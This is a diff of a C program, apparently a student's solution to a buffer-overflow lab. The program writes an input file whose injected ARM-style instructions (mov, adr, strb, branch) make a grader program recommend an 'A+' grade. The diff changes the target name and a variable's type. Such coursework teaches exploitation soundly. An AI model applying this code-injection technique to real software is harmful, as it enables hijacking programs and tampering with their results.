@@ -9,13 +9,12 @@
 /* This function takes no command-line arguments and does not read from 
    any streams. It writes to a file dataAplus, creating a file that, 
    when piped to the grader program, will cause the grader program to 
-   recommend a "A+" grade for "Rohan Alex". It then returns 0. */
+   recommend a "A+" grade for "Rolex". It then returns 0. */
 
 int main(void) {
    FILE *psFile;
    int i;
-   unsigned int mov, adr, branch, bl, strb;
-   unsigned long movLocation;
+   unsigned int mov, adr, branch, bl, strb, movLocation;
    psFile = fopen("dataAplus", "w");
 
    /* Puts truncated name in the buf array */ 
@@ -59,7 +58,7 @@ int main(void) {
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    fwrite(&branch, sizeof(unsigned int), 1, psFile);
-   fwrite (&movLocation, sizeof(unsigned long), 1, psFile);    
+   fwrite (&movLocation, sizeof(unsigned int), 1, psFile);    
 
    fclose(psFile);
    return 0;
